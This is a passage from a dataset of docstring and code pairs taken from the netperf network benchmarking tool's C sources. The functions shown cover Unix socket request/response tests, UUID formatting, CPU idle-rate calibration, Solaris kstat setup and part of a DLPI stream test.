stream_rr_request->recv_alignment,\n\t    stream_rr_request->recv_offset);\n    fprintf(where,\"recv_stream_rr: requested send alignment of %d offset %d\\n\",\n\t    stream_rr_request->send_alignment,\n\t    stream_rr_request->send_offset);\n    fflush(where);\n  }\n\n  /* at some point, these need to come to us from the remote system */\n  if (send_width == 0) send_width = 1;\n  if (recv_width == 0) recv_width = 1;\n\n  send_ring = allocate_buffer_ring(send_width,\n\t\t\t\t   stream_rr_request->response_size,\n\t\t\t\t   stream_rr_request->send_alignment,\n\t\t\t\t   stream_rr_request->send_offset);\n\n  recv_ring = allocate_buffer_ring(recv_width,\n\t\t\t\t   stream_rr_request->request_size,\n\t\t\t\t   stream_rr_request->recv_alignment,\n\t\t\t\t   stream_rr_request->recv_offset);\n\n\n  /* Let's clear-out our sockaddr for the sake of cleanlines. Then we\n     can put in OUR values !-) At some point, we may want to nail this\n     socket to a particular network-level address, but for now,\n     INADDR_ANY should be just fine. */\n\n  bzero((char *)&myaddr_un,\n\tsizeof(myaddr_un));\n  myaddr_un.sun_family      = AF_UNIX;\n\n  /* Grab a socket to listen on, and then listen on it. */\n\n  if (debug) {\n    fprintf(where,\"recv_stream_rr: grabbing a socket...\\n\");\n    fflush(where);\n  }\n\n  /* create_unix_socket expects to find some things in the global\n     variables, so set the globals based on the values in the request.\n     once the socket has been created, we will set the response values\n     based on the updated value of those globals. raj 7/94 */\n  lss_size_req = stream_rr_request->send_buf_size;\n  lsr_size_req = stream_rr_request->recv_buf_size;\n\n  s_listen = create_unix_socket(AF_UNIX,\n\t\t\t\tSOCK_STREAM);\n\n  if (s_listen == INVALID_SOCKET) {\n    netperf_response.content.serv_errno = errno;\n    send_response();\n\n    exit(1);\n  }\n\n  /* Let's get an address assigned to this socket so we can tell the\n     initiator how to reach the data socket. There may be a desire to\n     nail this socket to a specific IP address in a multi-homed,\n     multi-connection situation, but for now, we'll ignore the issue\n     and concentrate on single connection testing. */\n\n  strcpy(myaddr_un.sun_path,tempnam(path_prefix,\"netperf.\"));\n  if (bind(s_listen,\n\t   (struct sockaddr *)&myaddr_un,\n\t   sizeof(myaddr_un)) == SOCKET_ERROR) {\n    netperf_response.content.serv_errno = errno;\n    unlink(myaddr_un.sun_path);\n    close(s_listen);\n    send_response();\n\n    exit(1);\n  }\n\n  /* Now, let's set-up the socket to listen for connections */\n  if (listen(s_listen, 5) == SOCKET_ERROR) {\n    netperf_response.content.serv_errno = errno;\n    close(s_listen);\n    send_response();\n\n    exit(1);\n  }\n\n  /* Now myaddr_un contains the port and the internet address this is\n     returned to the sender also implicitly telling the sender that\n     the socket buffer sizing has been done. */\n\n  strcpy(stream_rr_response->unix_path,myaddr_un.sun_path);\n  netperf_response.content.serv_errno   = 0;\n\n  /* But wait, there's more. If the initiator wanted cpu measurements,\n     then we must call the calibrate routine, which will return the\n     max rate back to the initiator. If the CPU was not to be\n     measured, or something went wrong with the calibration, we will\n     return a 0.0 to the initiator. */\n\n  stream_rr_response->cpu_rate = 0.0; \t/* assume no cpu */\n  if (stream_rr_request->measure_cpu) {\n    stream_rr_response->measure_cpu = 1;\n    stream_rr_response->cpu_rate = calibrate_local_cpu(stream_rr_request->cpu_rate);\n  }\n\n\n  /* before we send the response back to the initiator, pull some of\n     the socket parms from the globals */\n  stream_rr_response->send_buf_size = lss_size;\n  stream_rr_response->recv_buf_size = lsr_size;\n\n  send_response();\n\n  addrlen = sizeof(peeraddr_un);\n\n  if ((s_data = accept(s_listen,\n\t\t       (struct sockaddr *)&peeraddr_un,\n\t\t       &addrlen)) == INVALID_SOCKET) {\n    /* Let's just punt. The remote will be given some information */\n    close(s_listen);\n\n    exit(1);\n  }\n\n  if (debug) {\n    fprintf(where,\"recv_stream_rr: accept completes on the data connection.\\n\");\n    fflush(where);\n  }\n\n  /* Now it's time to start receiving data on the connection. We will\n     first grab the apropriate counters and then start grabbing. */\n\n  cpu_start(stream_rr_request->measure_cpu);\n\n  /* The loop will exit when the sender does a shutdown, which will\n     return a length of zero  */\n\n  if (stream_rr_request->test_length > 0) {\n    times_up = 0;\n    trans_remaining = 0;\n    start_timer(stream_rr_request->test_length + PAD_TIME);\n  }\n  else {\n    times_up = 1;\n    trans_remaining = stream_rr_request->test_length * -1;\n  }\n\n  while ((!times_up) || (trans_remaining > 0)) {\n    temp_message_ptr = recv_ring->buffer_ptr;\n    request_bytes_remaining\t= stream_rr_request->request_size;\n\n    /* receive the request from the other side */\n    if (debug) {\n      fprintf(where,\"about to receive for trans %d\\n\",trans_received);\n      fprintf(where,\"temp_message_ptr is %p\\n\",temp_message_ptr);\n      fflush(where);\n    }\n    while(request_bytes_remaining > 0) {\n      if((request_bytes_recvd=recv(s_data,\n\t\t\t\t   temp_message_ptr,\n\t\t\t\t   request_bytes_remaining,\n\t\t\t\t   0)) == SOCKET_ERROR) {\n\tif (errno == EINTR) {\n\t  /* the timer popped */\n\t  timed_out = 1;\n\t  break;\n\t}\n\tnetperf_response.content.serv_errno = errno;\n\tsend_response();\n\texit(1);\n      }\n      else {\n\trequest_bytes_remaining -= request_bytes_recvd;\n\ttemp_message_ptr  += request_bytes_recvd;\n      }\n      if (debug) {\n\tfprintf(where,\"just received for trans %d\\n\",trans_received);\n\tfflush(where);\n      }\n    }\n\n    recv_ring = recv_ring->next;\n\n    if (timed_out) {\n      /* we hit the end of the test based on time - lets\n         bail out of here now... */\n      fprintf(where,\"yo5\\n\");\n      fflush(where);\n      break;\n    }\n\n    /* Now, send the response to the remote */\n    if (debug) {\n      fprintf(where,\"about to send for trans %d\\n\",trans_received);\n      fflush(where);\n    }\n    if((bytes_sent=send(s_data,\n\t\t\tsend_ring->buffer_ptr,\n\t\t\tstream_rr_request->response_size,\n\t\t\t0)) == SOCKET_ERROR) {\n      if (errno == EINTR) {\n\t/* the test timer has popped */\n\ttimed_out = 1;\n\tfprintf(where,\"yo6\\n\");\n\tfflush(where);\n\tbreak;\n      }\n      netperf_response.content.serv_errno = 997;\n      send_response();\n      exit(1);\n    }\n\n    send_ring = send_ring->next;\n\n    trans_received++;\n    if (trans_remaining) {\n      trans_remaining--;\n    }\n\n    if (debug) {\n      fprintf(where,\n\t      \"recv_stream_rr: Transaction %d complete\\n\",\n\t      trans_received);\n      fflush(where);\n    }\n  }\n\n\n  /* The loop now exits due to timeout or transaction count being\n     reached */\n\n  cpu_stop(stream_rr_request->measure_cpu,&elapsed_time);\n\n  if (timed_out) {\n    /* we ended the test by time, which was at least 2 seconds longer\n       than we wanted to run. so, we want to subtract PAD_TIME from\n       the elapsed_time. */\n    elapsed_time -= PAD_TIME;\n  }\n  /* send the results to the sender\t\t\t*/\n\n  if (debug) {\n    fprintf(where,\n\t    \"recv_stream_rr: got %d transactions\\n\",\n\t    trans_received);\n    fflush(where);\n  }\n\n  stream_rr_results->bytes_received\t= (trans_received *\n\t\t\t\t\t   (stream_rr_request->request_size +\n\t\t\t\t\t    stream_rr_request->response_size));\n  stream_rr_results->trans_received\t= trans_received;\n  stream_rr_results->elapsed_time\t= elapsed_time;\n  if (stream_rr_request->measure_cpu) {\n    stream_rr_results->cpu_util\t= calc_cpu_util(elapsed_time);\n  }\n\n  if (debug) {\n    fprintf(where,\n\t    \"recv_stream_rr: test complete, sending results.\\n\");\n    fflush(where);\n  }\n\n  send_response();\n  unlink(myaddr_un.sun_path);\n}", "path": "netperf/src/nettest_unix.c", "commit_date": "2015-10-30 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* This routine will create a data (listen) socket with the apropriate\n   options set and return it to the caller. this replaces all the\n   duplicate code in each of the test routines and should help make\n   things a little easier to understand. since this routine can be\n   called by either the netperf or netserver programs, all output\n   should be directed towards \"where.\" family is generally AF_UNIX,\n   and type will be either SOCK_STREAM or SOCK_DGRAM */\n", "func_signal": "SOCKET\ncreate_unix_socket(int family, int type)", "code": "{\n\n  SOCKET temp_socket;\n\n  /*set up the data socket                        */\n  temp_socket = socket(family,\n\t\t       type,\n\t\t       0);\n\n  if (temp_socket == INVALID_SOCKET){\n    fprintf(where,\n\t    \"netperf: create_unix_socket: socket: %d\\n\",\n\t    errno);\n    fflush(where);\n    exit(1);\n  }\n\n  if (debug) {\n    fprintf(where,\"create_unix_socket: socket %d obtained...\\n\",temp_socket);\n    fflush(where);\n  }\n\n  /* Modify the local socket size. The reason we alter the send buffer\n     size here rather than when the connection is made is to take care\n     of decreases in buffer size. Decreasing the window size after\n     connection establishment is a STREAM no-no. Also, by setting the\n     buffer (window) size before the connection is established, we can\n     control the STREAM MSS (segment size). The MSS is never more that\n     1/2 the minimum receive buffer size at each half of the\n     connection.  This is why we are altering the receive buffer size\n     on the sending size of a unidirectional transfer. If the user has\n     not requested that the socket buffers be altered, we will try to\n     find-out what their values are. If we cannot touch the socket\n     buffer in any way, we will set the values to -1 to indicate\n     that.  */\n\n  set_sock_buffer(temp_socket, SEND_BUFFER, lss_size_req, &lss_size);\n  set_sock_buffer(temp_socket, RECV_BUFFER, lsr_size_req, &lsr_size);\n\n  return(temp_socket);\n\n}", "path": "netperf/src/nettest_unix.c", "commit_date": "2015-10-30 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* puid -- print a UUID */\n", "func_signal": "void puid(netperf_uuid_t u)", "code": "{\n  int i;\n\n  printf(\"%8.8x-%4.4x-%4.4x-%2.2x%2.2x-\", u.time_low, u.time_mid,\n\t u.time_hi_and_version, u.clock_seq_hi_and_reserved,\n\t u.clock_seq_low);\n  for (i = 0; i < 6; i++)\n    printf(\"%2.2x\", u.node[i]);\n  printf(\"\\n\");\n}", "path": "netperf/src/net_uuid.c", "commit_date": "2016-06-02 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* measured cpu rate to the calling routine. raj 4/95 */\n", "func_signal": "float\ncalibrate_idle_rate (int iterations, int interval)", "code": "{\n\n  uint64_t\n    firstcnt[MAXCPUS],\n    secondcnt[MAXCPUS];\n\n  float\n    elapsed,\n    temp_rate,\n    rate[MAXTIMES],\n    local_maxrate;\n\n  long\n    sec,\n    usec;\n\n  int\n    i,\n    j;\n\n  struct  timeval time1, time2 ;\n  struct  timezone tz;\n\n  if (iterations > MAXTIMES) {\n    iterations = MAXTIMES;\n  }\n\n  local_maxrate = (float)-1.0;\n\n  for(i = 0; i < iterations; i++) {\n    rate[i] = (float)0.0;\n    for (j = 0; j < lib_num_loc_cpus; j++) {\n      firstcnt[j] = *(lib_idle_address[j]);\n    }\n    gettimeofday (&time1, &tz);\n    sleep(interval);\n    gettimeofday (&time2, &tz);\n\n    if (time2.tv_usec < time1.tv_usec)\n      {\n        time2.tv_usec += 1000000;\n        time2.tv_sec -=1;\n      }\n    sec = time2.tv_sec - time1.tv_sec;\n    usec = time2.tv_usec - time1.tv_usec;\n    elapsed = (float)sec + ((float)usec/(float)1000000.0);\n\n    if(debug) {\n      fprintf(where, \"Calibration for counter run: %d\\n\",i);\n      fprintf(where,\"\\tsec = %ld usec = %ld\\n\",sec,usec);\n      fprintf(where,\"\\telapsed time = %g\\n\",elapsed);\n    }\n\n    for (j = 0; j < lib_num_loc_cpus; j++) {\n      secondcnt[j] = *(lib_idle_address[j]);\n      if(debug) {\n        /* I know that there are situations where compilers know about */\n        /* long long, but the library fucntions do not... raj 4/95 */\n        fprintf(where,\n                \"\\tfirstcnt[%d] = 0x%8.8lx%8.8lx secondcnt[%d] = 0x%8.8lx%8.8lx\\n\",\n                j,\n                (uint32_t)(firstcnt[j]>>32),\n                (uint32_t)(firstcnt[j]&0xffffffff),\n                j,\n                (uint32_t)(secondcnt[j]>>32),\n                (uint32_t)(secondcnt[j]&0xffffffff));\n      }\n      /* we assume that it would wrap no more than once. we also */\n      /* assume that the result of subtracting will \"fit\" raj 4/95 */\n      temp_rate = (secondcnt[j] >= firstcnt[j]) ?\n        (float)(secondcnt[j] - firstcnt[j])/elapsed :\n          (float)(secondcnt[j]-firstcnt[j]+MAXLONG)/elapsed;\n      if (temp_rate > rate[i]) rate[i] = temp_rate;\n      if(debug) {\n        fprintf(where,\"\\trate[%d] = %g\\n\",i,rate[i]);\n        fflush(where);\n      }\n      if (local_maxrate < rate[i]) local_maxrate = rate[i];\n    }\n  }\n  if(debug) {\n    fprintf(where,\"\\tlocal maxrate = %g per sec. \\n\",local_maxrate);\n    fflush(where);\n  }\n  return local_maxrate;\n}", "path": "netperf/src/netcpu_looper.c", "commit_date": "2014-06-03 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* true_random -- generate a crypto-quality random number.\n**This sample doesn't do that.** */\n", "func_signal": "static uint16_t true_random(void)", "code": "{\n  static int inited = 0;\n  uuid_time_t time_now;\n\n  if (!inited) {\n    get_system_time(&time_now);\n    time_now = time_now / UUIDS_PER_TICK;\n    srand((unsigned int)\n\t  (((time_now >> 32) ^ time_now) & 0xffffffff));\n    inited = 1;\n  }\n\n  return (uint16_t)rand();\n}", "path": "netperf/src/net_uuid.c", "commit_date": "2016-06-02 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* snpuid -- print a UUID in the supplied buffer */\n", "func_signal": "void snpuid(char *str, size_t size, netperf_uuid_t u)", "code": "{\n  int i;\n  char *tmp = str;\n\n  if (size < 38) {\n    snprintf(tmp,size,\"%s\",\"uuid string too small\");\n    return;\n  }\n\n  /* perhaps this is a trifle optimistic but what the heck */\n  sprintf(tmp,\n\t  \"%8.8x-%4.4x-%4.4x-%2.2x%2.2x-\",\n\t  u.time_low,\n\t  u.time_mid,\n\t  u.time_hi_and_version,\n\t  u.clock_seq_hi_and_reserved,\n\t  u.clock_seq_low);\n  tmp += 24;\n  for (i = 0; i < 6; i++) {\n    sprintf(tmp,\"%2.2x\", u.node[i]);\n    tmp += 2;\n  }\n  *tmp = 0;\n  \n}", "path": "netperf/src/net_uuid.c", "commit_date": "2016-06-02 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* uuid_create -- generator a UUID */\n", "func_signal": "int uuid_create(netperf_uuid_t *uuid)", "code": "{\n  uuid_time_t timestamp;\n  uint16_t clockseq;\n  uuid_node_t node;\n  \n  /* get time, node ID, saved state from non-volatile storage */\n  get_current_time(&timestamp);\n  get_ieee_node_identifier(&node);\n  \n  /* for us clockseq is always to be random as we have no state */\n  clockseq = true_random();\n  \n  /* stuff fields into the UUID */\n  format_uuid_v1(uuid, clockseq, timestamp, node);\n  return 1;\n}", "path": "netperf/src/net_uuid.c", "commit_date": "2016-06-02 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* do the initial open of the kstat interface, get the chain id's all\n   straightened-out and set-up the addresses for get_kstat_idle to do\n   its thing.  liberally borrowed from the sources to TOP. raj 8/2000 */\n", "func_signal": "static int\nopen_kstat()", "code": "{\n  kstat_t *ks;\n  kid_t nkcid;\n  int i;\n  int changed = 0;\n  static int ncpu = 0;\n\n  kstat_named_t *kn;\n\n  if (debug) {\n    fprintf(where,\"open_kstat: enter\\n\");\n    fflush(where);\n  }\n\n  /*\n   * 0. kstat_open\n   */\n\n  if (!kc)\n    {\n      kc = kstat_open();\n      if (!kc)\n        {\n          perror(\"kstat_open \");\n          exit(1);\n        }\n      changed = 1;\n      kcid = kc->kc_chain_id;\n    }\n#ifdef rickwasstupid\n  else {\n    fprintf(where,\"open_kstat double open!\\n\");\n    fflush(where);\n    exit(1);\n  }\n#endif\n\n  /* keep doing it until no more changes */\n kcid_changed:\n\n  if (debug) {\n    fprintf(where,\"passing kcid_changed\\n\");\n    fflush(where);\n  }\n\n  /*\n   * 1.  kstat_chain_update\n   */\n  nkcid = kstat_chain_update(kc);\n  if (nkcid)\n    {\n      /* UPDKCID will abort if nkcid is -1, so no need to check */\n      changed = 1;\n      kcid = nkcid;\n    }\n  UPDKCID(nkcid,0);\n\n  if (debug) {\n    fprintf(where,\"kstat_lookup for unix/system_misc\\n\");\n    fflush(where);\n  }\n\n  ks = kstat_lookup(kc, \"unix\", 0, \"system_misc\");\n  if (kstat_read(kc, ks, 0) == -1) {\n    perror(\"kstat_read\");\n    exit(1);\n  }\n\n\n  if (changed) {\n\n    /*\n     * 2. get data addresses\n     */\n\n    ncpu = 0;\n\n    kn = kstat_data_lookup(ks, \"ncpus\");\n    if (kn && kn->value.ui32 > lib_num_loc_cpus) {\n      fprintf(stderr,\"number of CPU's mismatch!\");\n      exit(1);\n    }\n\n    for (ks = kc->kc_chain; ks;\n         ks = ks->ks_next)\n      {\n        if (strncmp(ks->ks_name, \"cpu_stat\", 8) == 0)\n          {\n            nkcid = kstat_read(kc, ks, NULL);\n            /* if kcid changed, pointer might be invalid. we'll deal\n               wtih changes at this stage, but will not accept them\n               when we are actually in the middle of reading\n               values. hopefully this is not going to be a big\n               issue. raj 8/2000 */\n            UPDKCID(nkcid, kcid);\n\n            if (debug) {\n              fprintf(where,\"cpu_ks[%d] getting %p\\n\",ncpu,ks);\n              fflush(where);\n            }\n\n            cpu_ks[ncpu] = ks;\n            ncpu++;\n            if (ncpu > lib_num_loc_cpus)\n              {\n                /* with the check above, would we ever hit this? */\n                fprintf(stderr,\n                        \"kstat finds too many cpus %d: should be %d\\n\",\n                        ncpu,lib_num_loc_cpus);\n                exit(1);\n              }\n          }\n      }\n    /* note that ncpu could be less than ncpus, but that's okay */\n    changed = 0;\n  }\n}", "path": "netperf/src/netcpu_kstat.c", "commit_date": "2014-06-03 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/* This routine implements the CO unidirectional data transfer test */\n/* (a.k.a. stream) for the sockets interface. It receives its */\n/* parameters via global variables from the shell and writes its */\n/* output to the standard output. */\n", "func_signal": "void\nsend_dlpi_co_stream()", "code": "{\n\n  char *tput_title = \"\\\nRecv   Send    Send                          \\n\\\nWindow Window  Message  Elapsed              \\n\\\nSize   Size    Size     Time     Throughput  \\n\\\nframes frames  bytes    secs.    %s/sec  \\n\\n\";\n\n  char *tput_fmt_0 =\n    \"%7.2f\\n\";\n\n  char *tput_fmt_1 =\n    \"%5d  %5d  %6d    %-6.2f   %7.2f   \\n\";\n\n  char *cpu_title = \"\\\nRecv   Send    Send                          Utilization    Service Demand\\n\\\nWindow Window  Message  Elapsed              Send   Recv    Send    Recv\\n\\\nSize   Size    Size     Time     Throughput  local  remote  local   remote\\n\\\nframes frames  bytes    secs.    %-8.8s/s  %%      %%       us/KB   us/KB\\n\\n\";\n\n  char *cpu_fmt_0 =\n    \"%6.3f\\n\";\n\n  char *cpu_fmt_1 =\n    \"%5d  %5d  %6d    %-6.2f     %7.2f   %-6.2f %-6.2f  %-6.3f  %-6.3f\\n\";\n\n  char *ksink_fmt = \"\\n\\\nAlignment      Offset         %-8.8s %-8.8s    Sends   %-8.8s Recvs\\n\\\nLocal  Remote  Local  Remote  Xfered   Per                 Per\\n\\\nSend   Recv    Send   Recv             Send (avg)          Recv (avg)\\n\\\n%5d   %5d  %5d   %5d %6.4g  %6.2f     %6d %6.2f   %6d\\n\";\n\n\n  float\t\t\telapsed_time;\n\n#ifdef WANT_INTERVALS\n  int interval_count;\n#endif /* WANT_INTERVALS */\n\n  /* what we want is to have a buffer space that is at least one */\n  /* send-size greater than our send window. this will insure that we */\n  /* are never trying to re-use a buffer that may still be in the hands */\n  /* of the transport. This buffer will be malloc'd after we have found */\n  /* the size of the local senc socket buffer. We will want to deal */\n  /* with alignment and offset concerns as well. */\n\n  struct ring_elt *send_ring;\n  char\t*message;\n  char\t*message_ptr;\n  struct strbuf send_message;\n  char  dlsap[BUFSIZ];\n  int   dlsap_len;\n  int\t*message_int_ptr;\n  int\tmessage_offset;\n  int\tmalloc_size;\n\n  int\tlen;\n  int\tnummessages;\n  int\tsend_descriptor;\n  int\tbytes_remaining;\n  /* with links like fddi, one can send > 32 bits worth of bytes */\n  /* during a test... ;-) */\n  double\tbytes_sent;\n\n#ifdef DIRTY\n  int\ti;\n#endif /* DIRTY */\n\n  float\tlocal_cpu_utilization;\n  float\tlocal_service_demand;\n  float\tremote_cpu_utilization;\n  float\tremote_service_demand;\n  double\tthruput;\n\n  struct\tdlpi_co_stream_request_struct\t*dlpi_co_stream_request;\n  struct\tdlpi_co_stream_response_struct\t*dlpi_co_stream_response;\n  struct\tdlpi_co_stream_results_struct\t*dlpi_co_stream_result;\n\n  dlpi_co_stream_request\t=\n    (struct dlpi_co_stream_request_struct *)netperf_request.content.test_specific_data;\n  dlpi_co_stream_response\t=\n    (struct dlpi_co_stream_response_struct *)netperf_response.content.test_specific_data;\n  dlpi_co_stream_result\t        =\n    (struct dlpi_co_stream_results_struct *)netperf_response.content.test_specific_data;\n\n  if ( print_headers ) {\n    fprintf(where,\"DLPI CO STREAM TEST\\n\");\n    if (local_cpu_usage || remote_cpu_usage)\n      fprintf(where,cpu_title,format_units());\n    else\n      fprintf(where,tput_title,format_units());\n  }\n\n  /* initialize a few counters */\n\n  nummessages\t=\t0;\n  bytes_sent\t=\t0.0;\n  times_up \t= \t0;\n\n  /*set up the data descriptor                        */\n  send_descriptor = dl_open(loc_dlpi_device,loc_ppa);\n  if (send_descriptor < 0){\n    perror(\"netperf: send_dlpi_co_stream: dlpi stream data descriptor\");\n    exit(1);\n  }\n\n  /* bind the puppy and get the assigned dlsap */\n  dlsap_len = BUFSIZ;\n  if (dl_bind(send_descriptor,\n              dlpi_sap, DL_CODLS, dlsap, &dlsap_len) != 0) {\n    fprintf(where,\"send_dlpi_co_rr: bind failure\\n\");\n    fflush(where);\n    exit(1);\n  }\n\n  if (debug) {\n    fprintf(where,\"send_dlpi_co_stream: send_descriptor obtained...\\n\");\n  }\n\n#ifdef DL_HP_SET_LOCAL_WIN_REQ\n  if (lsw_size > 0) {\n    if (debug > 1) {\n      fprintf(where,\"netperf: send_dlpi_co_stream: window send size altered from system default...\\n\");\n      fprintf(where,\"                          send: %d\\n\",lsw_size);\n    }\n  }\n  if (lrw_size > 0) {\n    if (debug > 1) {\n      fprintf(where,\n\t      \"netperf: send_dlpi_co_stream: window recv size altered from system default...\\n\");\n      fprintf(where,\"                          recv: %d\\n\",lrw_size);\n    }\n  }\n\n\n  /* Now, we will find-out what the size actually became, and report */\n  /* that back to the user. If the call fails, we will just report a -1 */\n  /* back to the initiator for the recv buffer size. */\n\n\n  if (debug) {\n    fprintf(where,\n\t    \"netperf: send_dlpi_co_stream: window sizes determined...\\n\");\n    fprintf(where,\"         send: %d recv: %d\\n\",lsw_size,lrw_size);\n    fflush(where);\n  }\n\n#else /* DL_HP_SET_LOCAL_WIN_REQ */\n\n  lsw_size = -1;\n  lrw_size = -1;\n\n#endif /* DL_HP_SET_LOCAL_WIN_REQ */\n\n  /* we should pick a default send_size, it should not be larger than */\n  /* the min of the two interface MTU's, and should perhaps default to */\n  /* the Interface MTU, but for now, we will default it to 1024... if */\n  /* someone wants to change this, the should change the corresponding */\n  /* lines in the recv_dlpi_co_stream routine */\n\n  if (send_size == 0) {\n    send_size = 1024;\n  }\n\n  /* set-up the data buffer with the requested alignment and offset. */\n  /* After we have calculated the proper starting address, we want to */\n  /* put that back into the message variable so we go back to the */\n  /* proper place. note that this means that only the first send is */\n  /* guaranteed to be at the alignment specified by the -a parameter. I */\n  /* think that this is a little more \"real-world\" than what was found */\n  /* in previous versions. note also that we have allocated a quantity */\n  /* of memory that is at least one send-size greater than our socket */\n  /* buffer size. We want to be sure that there are at least two */\n  /* buffers allocated - this can be a bit of a problem when the */\n  /* send_size is bigger than the socket size, so we must check... the */\n  /* user may have wanted to explicitly set the \"width\" of our send */\n  /* buffers, we should respect that wish... */\n  if (send_width == 0) {\n    send_width = (lsw_size/send_size) + 1;\n    if (send_width == 1) send_width++;\n  }\n\n  send_ring = allocate_buffer_ring(send_width,\n\t\t\t\t   send_size,\n\t\t\t\t   local_send_align,\n\t\t\t\t   local_send_offset);\n\n  send_message.maxlen = send_size;\n  send_message.len = send_size;\n  send_message.buf = send_ring->buffer_ptr;\n\n  /* If the user has requested cpu utilization measurements, we must */\n  /* calibrate the cpu(s). We will perform this task within the tests */\n  /* themselves. If the user has specified the cpu rate, then */\n  /* calibrate_local_cpu will return rather quickly as it will have */\n  /* nothing to do. If local_cpu_rate is zero, then we will go through */\n  /* all the \"normal\" calibration stuff and return the rate back.*/\n\n  if (local_cpu_usage) {\n    local_cpu_rate = calibrate_local_cpu(local_cpu_rate);\n  }\n\n  /* Tell the remote end to do a listen. The server alters the socket */\n  /* paramters on the other side at this point, hence the reason for */\n  /* all the values being passed in the setup message. If the user did */\n  /* not specify any of the parameters, they will be passed as 0, which */\n  /* will indicate to the remote that no changes beyond the system's */\n  /* default should be used. */\n\n  netperf_request.content.request_type\t =\tDO_DLPI_CO_STREAM;\n  dlpi_co_stream_request->send_win_size =\trsw_size;\n  dlpi_co_stream_request->recv_win_size =\trrw_size;\n  dlpi_co_stream_request->receive_size\t =\trecv_size;\n  dlpi_co_stream_request->recv_alignment=\tremote_recv_align;\n  dlpi_co_stream_request->recv_offset\t =\tremote_recv_offset;\n  dlpi_co_stream_request->measure_cpu\t =\tremote_cpu_usage;\n  dlpi_co_stream_request->cpu_rate\t =\tremote_cpu_rate;\n  dlpi_co_stream_request->ppa           =      rem_ppa;\n  dlpi_co_stream_request->sap           =      dlpi_sap;\n  dlpi_co_stream_request->dev_name_len  =      strlen(rem_dlpi_device);\n  strcpy(dlpi_co_stream_request->dlpi_device,\n\t rem_dlpi_device);\n\n#ifdef __alpha\n\n  /* ok - even on a DEC box, strings are strings. I didn't really want */\n  /* to ntohl the words of a string. since I don't want to teach the */\n  /* send_ and recv_ _request and _response routines about the types, */\n  /* I will put \"anti-ntohl\" calls here. I imagine that the \"pure\" */\n  /* solution would be to use XDR, but I am still leary of being able */\n  /* to find XDR libs on all platforms I want running netperf. raj */\n  {\n    int *charword;\n    int *initword;\n    int *lastword;\n\n    initword = (int *) dlpi_co_stream_request->dlpi_device;\n    lastword = initword + ((strlen(rem_dlpi_device) + 3) / 4);\n\n    for (charword = initword;\n\t charword < lastword;\n\t charword++) {\n\n      *charword = ntohl(*charword);\n    }\n  }\n#endif /* __alpha */\n\n  if (test_time) {\n    dlpi_co_stream_request->test_length\t=\ttest_time;\n  }\n  else {\n    dlpi_co_stream_request->test_length\t=\ttest_bytes;\n  }\n#ifdef DIRTY\n  dlpi_co_stream_request->dirty_count       =       rem_dirty_count;\n  dlpi_co_stream_request->clean_count       =       rem_clean_count;\n#endif /* DIRTY */\n\n\n  if (debug > 1) {\n    fprintf(where,\n\t    \"netperf: send_dlpi_co_stream: requesting DLPI CO stream test\\n\");\n  }\n\n  send_request();\n\n  /* The response from the remote will contain all of the relevant \t*/\n  /* parameters for this test type. We will put them back into \t*/\n  /* the variables here so they can be displayed if desired.  The\t*/\n  /* remote will have calibrated CPU if necessary, and will have done\t*/\n  /* all the needed set-up we will have calibrated the cpu locally\t*/\n  /* before sending the request, and will grab the counter value right\t*/\n  /* after the connect returns. The remote will grab the counter right\t*/\n  /* after the accept call. This saves the hassle of extra messages\t*/\n  /* being sent for the TCP tests.\t\t\t\t\t*/\n\n  recv_response();\n\n  if (!netperf_response.content.serv_errno) {\n    if (debug)\n      fprintf(where,\"remote listen done.\\n\");\n    rrw_size\t=\tdlpi_co_stream_response->recv_win_size;\n    rsw_size\t=\tdlpi_co_stream_response->send_win_size;\n    remote_cpu_usage=\tdlpi_co_stream_response->measure_cpu;\n    remote_cpu_rate = \tdlpi_co_stream_response->cpu_rate;\n  }\n  else {\n    Set_errno(netperf_response.content.serv_errno);\n    perror(\"netperf: remote error\");\n    exit(1);\n  }\n\n  /* Connect up to the remote port on the data descriptor */\n  if(dl_connect(send_descriptor,\n\t\tdlpi_co_stream_response->station_addr,\n\t\tdlpi_co_stream_response->station_addr_len) != 0) {\n    fprintf(where,\"recv_dlpi_co_stream: connect failure\\n\");\n    fflush(where);\n    exit(1);\n  }\n\n  /* Data Socket set-up is finished. If there were problems, either the */\n  /* connect would have failed, or the previous response would have */\n  /* indicated a problem. I failed to see the value of the extra */\n  /* message after the accept on the remote. If it failed, we'll see it */\n  /* here. If it didn't, we might as well start pumping data. */\n\n  /* Set-up the test end conditions. For a stream test, they can be */\n  /* either time or byte-count based. */\n\n  if (test_time) {\n    /* The user wanted to end the test after a period of time. */\n    times_up = 0;\n    bytes_remaining = 0;\n    start_timer(test_time);\n  }\n  else {\n    /* The tester wanted to send a number of bytes. */\n    bytes_remaining = test_bytes;\n    times_up = 1;\n  }\n\n  /* The cpu_start routine will grab the current time and possibly */\n  /* value of the idle counter for later use in measuring cpu */\n  /* utilization and/or service demand and thruput. */\n\n  cpu_start(local_cpu_usage);\n\n  /* We use an \"OR\" to control test execution. When the test is */\n  /* controlled by time, the byte count check will always return false. */\n  /* When the test is controlled by byte count, the time test will */\n  /* always return false. When the test is finished, the whole */\n  /* expression will go false and we will stop sending data. */\n\n#ifdef DIRTY\n  /* initialize the random number generator for putting dirty stuff */\n  /* into the send buffer. raj */\n  srand((int) getpid());\n#endif /* DIRTY */\n\n  while ((!times_up) || (bytes_remaining > 0)) {\n\n#ifdef DIRTY\n    /* we want to dirty some number of consecutive integers in the buffer */\n    /* we are about to send. we may also want to bring some number of */\n    /* them cleanly into the cache. The clean ones will follow any dirty */\n    /* ones into the cache. */\n    message_int_ptr = (int *)message_ptr;\n    for (i = 0; i < loc_dirty_count; i++) {\n      *message_int_ptr = rand();\n      